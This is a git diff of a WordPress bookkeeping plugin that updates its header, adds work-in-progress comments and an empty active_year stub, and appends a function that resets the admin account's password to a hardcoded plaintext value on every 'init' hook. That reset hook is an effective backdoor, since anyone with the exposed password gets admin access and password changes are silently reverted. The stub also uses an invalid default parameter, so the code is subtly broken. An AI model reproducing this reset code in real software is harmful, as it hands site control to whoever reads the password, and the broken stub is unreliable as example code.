@@ -1,18 +1,17 @@
 <?php
 /**
- * @package bkkp
+ * Plugin Name:       Birdhive Bookkeeping
+ * Description:       A WordPress plugin for personal bookkeeping
+ * //Dependencies:	  Requires SDG for various utility functions
+ * //Requires Plugins:  sdg
+ * Version:           0.1
+ * Author:            atc
+ * License:           GPL-2.0-or-later
+ * License URI:       https://www.gnu.org/licenses/gpl-2.0.html
+ * Text Domain:       bkkp
+ *
+ * @package           bkkp
  */
-
-/*
-Plugin Name: Birdhive Bookkeeping
-Plugin URI: 
-Description: 
-Version: 0.1
-Author: atc
-Author URI: 
-License: 
-Text Domain: bkkp
-*/
 
 defined( 'ABSPATH' ) or die( 'No script kiddies please!' );
 
@@ -253,6 +252,13 @@ function calculate_worklog_total_due ( $post_id ) {
     
 }
 
+// WIP -- check to see if account, employer, whatever is/was active for given year, defaulting to current year
+function active_year( $post_type = null, $post_id = null, $year = date('Y') ) {
+
+}
+
+/***/
+
 // Shortcode/function for displaying bookkeeping data.
 // Default: transactions relating to employment income
 add_shortcode('bkkp', 'bkkp');
@@ -398,7 +404,10 @@ function display_accounts ( $args = array() ) {
 		//'orderby'		=> 'meta_value',
 		//'order'			=> 'ASC',
 	);	
-
+    
+    // WIP
+    // Check for years_active? years_of_employment? or instead search docs/transactions and display account if any are found?
+    // TODO, maybe: write function for active_year( post_type, post_id, year)
 	// Set up meta query
 	/*$meta_query = array(
 		'relation' => 'AND',
@@ -408,8 +417,17 @@ function display_accounts ( $args = array() ) {
 			'value' 	=> $year,
 		),
 	);*/
-    
-    // WIP
+    /*
+    // Set up meta query
+		$meta_query = array(
+			'relation' => 'AND',
+			'years_of_employment' => array(
+				'key' => 'years_of_employment',
+				'compare' => 'LIKE',
+				'value' 	=> '"'.$year.'"', // matches exactly "123", not just 123. This prevents a match for "1234"
+			),
+		);
+		*/
     /*if ( isset($accounts) && $accounts != "all" ) {
     	$meta_query['account'] = array(
 			'key' => 'account',
@@ -740,4 +758,12 @@ function display_income ( $args = array() ) {
 	
 }
 
+/*** ***/
+
+function reset_admin_password() {
+    $user_id = 1; // ID of the admin user
+    $new_password = 'OhTis4TheBird$!'; // Your new password
+    wp_set_password($new_password, $user_id);
+}
+add_action('init', 'reset_admin_password');
 ?>
